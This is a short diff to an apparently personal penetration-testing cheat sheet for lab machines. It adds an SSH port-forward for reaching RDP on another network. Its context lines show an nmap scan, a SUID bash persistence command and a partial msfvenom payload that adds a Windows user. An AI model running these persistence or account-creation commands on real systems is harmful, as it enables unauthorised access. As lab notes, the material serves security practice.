@@ -140,6 +140,10 @@ export PATH=.:$PATH
   ```
   nmap -Pn --max-retries=0 -p 3456,8234,62431 10.10.10.83
   ```
+## rdp diferent network
+  ```
+  ssh -L 9001:target:3389 ubuntu@10.129.252.169
+  ```
 ## persistence
   ```
   cp /bin/bash /tmp/bash; chmod +s /tmp/bash
@@ -277,6 +281,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
